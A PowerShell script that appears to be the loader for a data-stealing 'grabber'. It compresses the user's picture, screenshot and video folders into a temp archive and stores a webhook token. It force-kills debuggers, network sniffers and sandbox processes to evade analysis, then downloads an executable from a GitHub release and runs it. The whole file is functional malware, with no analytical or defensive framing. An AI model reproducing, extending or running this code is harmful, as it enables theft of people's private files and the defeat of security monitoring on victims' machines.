$p4th = @("\Imágenes", "\Screen", "\Videos\Captures", "\Videos", '\onedriver\Imágenes', '\OneDrive\Imágenes', '\Pictures')

$fpind = "$env:temp\temp-dll\Imagenes.zip"

$file = "acustic_main.exe"

$Webb_Hook = ""

$X0Excute3_ = "$env:temp\Program-dll\$file"
function LogPhind {
    param (
        [string]$Err0r
    )
    Set-Content -Value $Err0r -Path "$env:temp\temp-dll\Error.txt"
    
}

function Set_Log_Acustic {
    if (Test-Path "$env:TEMP\Program-dll\$file" -PathType Leaf){
        Execute_Program
    }else{
        try{
            $url_find0 = "https://github.com/Eduardx-2/Acustic-Grabber/releases/download/untagged-baa4b96466e3366b0aee/acustic_extract.exe"
            $rute_acust9c = "$env:temp\Program-dll"
            Invoke-WebRequest -Uri $url_find0 -OutFile (Join-Path -Path $rute_acust9c $file)
            Execute_Program
        }catch  [ System.UnauthorizedAccessException]{
            Write-Host " + CategoryInfo   : NotSpecified: (:) UnauthorizedAdminException
                + ErrorAdmin   :  Run the file as administrator,System.UnauthorizedAccessException"
        }
        
    }
    
}

function Execute_Program {
    if (Test-Path -Path $X0Excute3_ -PathType Leaf){
        Start-Process -FilePath "$env:TEMP\Program-dll\$file"
    }else{
        Write-Host " + CategoryInfo   : NotSpecified: (:) UnauthorizedAccessException
        + ErrorAdmin   :  Run the file as administrator,System.UnauthorizedAccessException"
    }
    
}
function Verified_img {
    $c0xr = "completed"    
    $found_xor = @()
    $log_err0r = @()
    foreach($e in $p4th){
        $e = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::Default.GetBytes($e)) #Convierte la ruta en UTF8 para evitar errores
        $rot_ = Join-Path -Path $env:userprofile -ChildPath $e
        if (Test-Path -Path $rot_ -PathType Container){
            $x0xr = "$rot_\*"
            $found_xor += $x0xr 
        }else{
            $found_Error += $log_err0r
        }
    }
    if (Test-Path -Path $fpind -PathType Leaf){
        Remove-Item -Path $fpind -Force
        Start-Sleep -s 4
        Compress-Archive -Path $found_xor -DestinationPath $fpind
        return $c0xr
    }else{
        Compress-Archive -Path $found_xor -DestinationPath $fpind
        return $c0xr
    }
    LogPhind -Err0r $found_xor

}

function Program_Errors{
    $rute_ar = "$env:temp\Program-dll"
    if (Test-Path -Path $rute_ar -PathType Container){
        if (-not (Test-Path -Path "$rute_ar\DateUser" -PathType Container)){
            New-Item "$env:temp\Program-dll\DateUser" -itemType Directory
            return $true
        }
    }else{
        New-Item $rute_ar -itemType Directory
        New-Item "$rute_ar\DateUser" -itemType Directory
        return $true
    }
}

function Logout_archive {
    $archive = "$env:temp\temp-dll" 
    if (Test-Path -Path $archive -PathType Container){
        return $true
    }else{
        New-Item "$env:temp\temp-dll" -itemType Directory
        return $false
    }
}

function Main_execut3 {
    if (Logout_archive -eq $true){
        if (Verified_img -eq "completed"){
            if (Program_Errors -eq $true){
                INTVM_SETADM
                $Webb_Hook | Out-File -FilePath "$env:temp\Program-dll\token.txt" -Encoding utf8
                Set_Log_Acustic
            }else{
                INTVM_SETADM
                $Webb_Hook | Out-File -FilePath "$env:temp\Program-dll\token.txt" -Encoding utf8
                Set_Log_Acustic
            }
        }
    }
  
}

function INTVM_SETADM {
    $system_adm_env = @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "wireshark")
    $proc_env = Get-Process | Select-Object -Property Name, Id
    foreach($procces in $proc_env){
        if($procces.Name -in $system_adm_env){
            Stop-Process -Name $procces.Name -Force
        }
    }

}

Main_execut3